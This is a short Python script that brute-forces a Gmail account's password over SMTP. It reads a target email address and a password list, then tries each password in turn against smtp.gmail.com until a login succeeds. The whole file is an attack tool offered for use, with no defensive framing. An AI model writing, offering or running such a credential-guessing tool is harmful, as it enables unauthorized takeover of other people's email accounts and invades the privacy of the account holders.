import smtplib
import time

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("--> Enter the email address: ")
passwfile = input("--> Enter the password file: ")
passwfile = open(passwfile, "r")

for password in passwfile:

	try:

		time.sleep(1)
		smtpserver.login(user, password)
		print ("- Password found: %s" % password)
		break;

	except smtplib.SMTPAuthenticationError:
		time.sleep(1)
		print ("- Incorrect password: %s" % password)
